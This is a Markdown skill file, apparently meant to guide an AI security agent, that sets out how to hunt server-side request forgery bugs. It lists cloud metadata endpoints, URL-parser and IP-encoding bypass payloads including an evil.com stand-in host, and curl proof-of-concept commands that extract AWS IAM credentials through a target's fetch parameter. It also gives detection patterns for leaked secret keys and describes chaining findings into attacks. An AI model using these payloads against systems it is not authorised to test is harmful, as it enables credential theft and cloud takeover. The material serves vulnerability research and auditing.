---
name: ssrf
description: Hunt Server-Side Request Forgery (CWE-918) through taint analysis from user-controlled URLs to HTTP client sinks. Covers cloud metadata pivoting, DNS rebinding, gopher smuggling, and the IMDSv1 → IAM role chain that turns SSRF into RCE.
---

# SSRF Hunting Playbook

SSRF is one of the highest-yield vuln classes for 0-day work because
(a) it's often medium severity in isolation but chains to critical when
it reaches cloud metadata, internal admin panels, or unprotected
Redis/Elasticsearch, and (b) modern frameworks have dozens of bypass
classes that scanners miss.

## 1. Sources (user-controlled input that becomes a URL)

Look for any parameter that gets fed into an HTTP client:

- Python: `requests.get(user_url)`, `httpx.get`, `urllib.request.urlopen`, `aiohttp.get`
- Node:   `fetch(userUrl)`, `axios.get`, `http.request`, `got`, `node-fetch`
- Java:   `HttpURLConnection`, `HttpClient.send`, `URL.openConnection`, `OkHttpClient`
- Go:     `http.Get(u)`, `http.NewRequest`, `net.Dial("tcp", u)`
- Ruby:   `Net::HTTP.get`, `URI.open`, `Faraday.get`
- PHP:    `file_get_contents($url)`, `curl_exec`, `fsockopen`

Grep patterns to run via bash:

```bash
semgrep --config p/ssrf /workspace/src --sarif -o /workspace/sem-ssrf.sarif
grep -rE 'requests\.get\(|httpx\.|urllib.*urlopen|fetch\(|axios\.|http\.Get\(|URL\(' /workspace/src
```

## 2. Sinks that make SSRF worth reporting

| Sink                                  | Impact                                  |
|---------------------------------------|-----------------------------------------|
| `http://169.254.169.254/` (AWS IMDS)  | IAM role creds → full AWS takeover      |
| `http://metadata.google.internal/`    | GCP service-account token               |
| `http://169.254.169.254/metadata/v1/` | Azure IMDS                              |
| `http://127.0.0.1:6379/` (Redis)      | Unauthenticated RCE via Lua eval / cron |
| `http://127.0.0.1:9200/`              | Elasticsearch data leak + RCE           |
| `http://127.0.0.1:2375/`              | Docker daemon — container escape        |
| `gopher://`, `dict://`, `file://`     | Protocol smuggling (SMTP, memcached)    |
| Internal `*.svc.cluster.local`        | Kubernetes service mesh lateral         |

## 3. Bypass classes (why scanners miss real bugs)

1. **DNS rebinding**  — resolve to public first, then 127.0.0.1 on second
   lookup. Look for caches that don't pin IP across the fetch.
2. **IPv6 literal**   — `[::1]`, `[::ffff:127.0.0.1]`, `[::]`
3. **Decimal / octal / hex encoding** — `0x7f.0.0.1`, `0177.0.0.1`, `2130706433`
4. **URL parser confusion** — `http://evil.com@169.254.169.254/`,
   `http://169.254.169.254#.evil.com/`
5. **IDN unicode tricks** — homoglyph domains that normalize to metadata hosts
6. **Redirect chains** — allowlist checks the initial URL, not the 302 target
7. **IMDSv2 required** — but if the HTTP client sets a Metadata-Token header
   on redirect, v2 still leaks
8. **30x → file://** — server follows redirects across protocols

## 4. Taint audit workflow

1. Enumerate sources with grep + semgrep (above).
2. For each hit, follow the data flow manually:
   - Is there a `urlparse` check? Does it check `.hostname` (spoofable)
     or the raw URL (safe)?
   - Is there an IP allowlist check *before or after* DNS resolution?
     (Only before-resolution checks are TOCTOU-safe.)
   - Is redirect following disabled? `allow_redirects=False` in requests.
3. Each confirmed source-to-sink path → `kg_add_node(kind="vulnerability", ...)`.
4. Link the vuln to its file+line via a code_location node.

## 5. PoC template

```bash
# AWS IMDSv1 leak — copy to clipboard after confirmation
curl -s "https://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# → expect role name
curl -s "https://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>"
# → expect {AccessKeyId, SecretAccessKey, Token}
```

Success patterns for `validate_finding`:

- `AccessKeyId`
- `SecretAccessKey`
- `Token.*[A-Za-z0-9+/]{100,}`

Negative control:

- Same request with the URL param blanked or set to `https://example.com/`
- Negative patterns: `Missing url`, `400`, `example.com`

## 6. Default CVSS for confirmed SSRF

| Variant                                | CVSS vector                                          | Score |
|----------------------------------------|------------------------------------------------------|-------|
| Blind SSRF, external only              | AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N                  | 5.3   |
| SSRF → internal services (no pivot)    | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N                  | 7.5   |
| SSRF → cloud metadata → IAM credential | AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H                  | 10.0  |

## 7. Chain promotion

Once validated, add an `enables` edge from the SSRF vuln to the adjacent
IAM credential / Redis host / admin panel node. Weight 0.3 for trivial
IMDS chains, 0.6 for bypass-required variants. Then
`plan_attack_chains(promote=True)` to persist the complete chain.
